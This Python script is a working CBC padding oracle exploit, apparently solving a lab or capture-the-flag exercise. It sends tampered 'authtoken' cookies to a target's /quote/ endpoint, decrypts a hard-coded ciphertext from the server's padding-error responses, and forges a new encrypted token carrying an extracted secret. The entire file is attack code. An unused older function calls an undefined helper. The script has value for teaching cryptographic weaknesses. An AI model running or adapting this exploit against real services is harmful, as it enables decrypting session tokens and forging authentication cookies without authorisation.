#!/usr/bin/env python3

# CBC padding oracle attack
# - lenerd

import requests
import sys
import re
import time
from Crypto.Util.Padding import pad

def guess_padding_OLD(base_url, ciphertext, padding_guess):
    ba = bytearray(ciphertext)
    #print(ba)
    ba[-1 - 16] ^= padding_guess ^ 0x01
    new_ciphertext = bytes(ba)

    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': new_ciphertext.hex()})

    #print("DEBUG: ", res.text)

    if res.text.endswith("padding is incorrect."):
        return False

    return True
    #print(f'[+] done:\n{res.text}')

def guess_byte(base_url, ciphertext, position_from_right, byte_guess):
    ba = bytearray(ciphertext)
    ba[-16 - position_from_right] ^= byte_guess
    for i in range(1, position_from_right + 1):
        ba[-16 - i] ^= position_from_right

    if position_from_right < 16:
        ba[-16 - position_from_right - 1] = 0x69

    new_ciphertext = bytes(ba)

    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': new_ciphertext.hex()})

    #print("error from server: ", res.text)

    if res.text.lower().endswith("padding is incorrect."):
        return False

    return True

def find_last_16_bytes_OLD(base_url, ciphertext):
    pad = None
    for padding_guess in range(2, 16):
        if guess_padding(base_url, ciphertext, padding_guess):
            pad = padding_guess
            break
    #print("Padding found: ", pad)

    ba = bytearray(ciphertext)
    for i in range(1, pad+1):
        ba[-16 - i] ^= pad
    
    ciphertext = bytes(ba)

    message = [pad for _ in range(pad)]
    
    for pos in range(1, 16 - pad + 1):
        next_byte = None
        for byte_guess in range(0x20, 0x7e, 1): # From space to 'z'
            if guess_byte(base_url, ciphertext, pad + pos, byte_guess):
                next_byte = byte_guess
                break
        
        ba = bytearray(ciphertext)
        #print("Found first byte after padding: ", next_byte)

        ba[-16 - pad - pos] ^= next_byte
        ciphertext = bytes(ba)

        message.append(next_byte)
    
    message.reverse()

    m = bytes(message).decode("utf-8", errors="replace")

    return m

def find_last_16_bytes(base_url, ciphertext):
    message = []
    
    for pos in range(1, 17):
        next_byte = None
        for byte_guess in range(0x00, 0xff + 1, 1): # From padding and space to 'z'
            if guess_byte(base_url, ciphertext, pos, byte_guess):
                next_byte = byte_guess
                #print("DEBUG: Found byte: ", next_byte)
                break
        time.sleep(0.05)

        ba = bytearray(ciphertext)
        #print("Found first byte after padding: ", next_byte)

        print("Found byte:", next_byte)
        ba[-16 - pos] ^= next_byte
        ciphertext = bytes(ba)

        #if next_byte >= 20 # Only if printable (i.e exclude padding)
        message.append(next_byte)
    
    message.reverse()

    return bytearray(message)


def xor_ba(ba1, ba2):
    if len(ba1) != len(ba2):
        raise ValueError("Bytearrays have different sizes")
    result = []
    for b1, b2 in zip(ba1, ba2):
        result.append(b1 ^ b2)
    
    return bytearray(result)


def test_systems_security(base_url):
    ciphertext = bytes.fromhex('c820960182e14517ae3cc3e14db14b6f9cc94f34059732a7f5b7134f3b64444785921d419c2ee25223e4a892350e55cb220fc8ca8bb41373b9ce6d570b1e03fa')
    ba = bytearray(ciphertext)
    #print(ba)
    #print(len(ba))
    #m = find_last_16_bytes_OLD(base_url, ciphertext)
    #print("DEBUG: ", m)

    parts = []

    for i in range(0, len(ba) // 16 - 1, 1):
        c = bytes(ba[0:len(ba)-i*16])
        #print(ciphertext)
        m = find_last_16_bytes(base_url, c)
        m = bytes(m).decode("utf-8", errors="ignore")

        print("Found part: ", m)
        parts.append(m)
    
    m = "".join(reversed(parts))

    print(m)

    matches = re.fullmatch(r'You never figure out that "(.*)". :\).*', m)
    if not matches:
        raise ValueError("Found message doesn't respect the structure")
    secret = matches.group(1)

    secret = secret + ' plain CBC is not secure!'
    print("Found secret:", secret)

    #message_ba = bytearray(m.encode())

    secret_ba = bytearray(pad(secret.encode(), 16))

    forged_ba = bytearray(len(secret_ba) + 16)
    forged_ba[0:len(forged_ba)] = xor_ba(
        forged_ba[0:len(forged_ba)],
        ba[0:len(forged_ba)]
    )

    for i in range(len(forged_ba)//16 - 1, 0, -1):
        m2 = find_last_16_bytes(base_url, forged_ba[0:16*(i+1)])
        print("DEBUG:", m2)
        forged_ba[16*(i-1):16*i] = xor_ba(forged_ba[16*(i-1):16*i], m2)
        #print(forged_ba[16*(i-1):16*i], secret_ba[16*(i-1):16*i])
        forged_ba[16*(i-1):16*i] = xor_ba(forged_ba[16*(i-1):16*i], secret_ba[16*(i-1):16*i])

    print(bytes(forged_ba).hex())

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    test_systems_security(sys.argv[1])
